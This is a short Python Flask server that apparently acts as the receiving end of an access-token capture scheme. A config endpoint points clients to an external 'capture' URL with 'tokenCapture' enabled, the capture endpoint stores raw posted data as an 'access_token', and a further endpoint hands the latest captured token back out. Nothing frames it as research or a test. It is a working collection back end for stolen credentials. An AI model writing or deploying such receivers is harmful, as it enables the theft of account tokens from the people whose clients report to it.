from flask import Flask, request, jsonify
import json
import time

app = Flask(__name__)
tokens = {}

@app.route('/')
def home():
    return "✅ Server is running! Use /api/config"

@app.route('/api/config', methods=['GET'])
def config():
    return jsonify({
        "verAddr": "https://accessstoken-i0dx.onrender.com/api/capture",
        "tokenCapture": True,
        "version": "1.0.0"
    })

@app.route('/api/capture', methods=['POST', 'GET'])
def capture():
    if request.method == 'GET':
        return "✅ Capture endpoint is working. Send POST request with data.", 200
    
    raw = request.get_data()
    print(f"[*] Received {len(raw)} bytes")
    
    tokens['latest'] = {
        'access_token': raw.hex()[:64] if raw else "NO_DATA",
        'open_id': "TEST_123",
        'timestamp': time.time()
    }
    
    return "OK", 200, {'Content-Type': 'text/plain'}

@app.route('/api/get-token', methods=['GET'])
def get_token():
    data = tokens.get('latest')
    if data:
        return jsonify(data)
    return jsonify({"error": "No token yet"}), 404

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=10000)
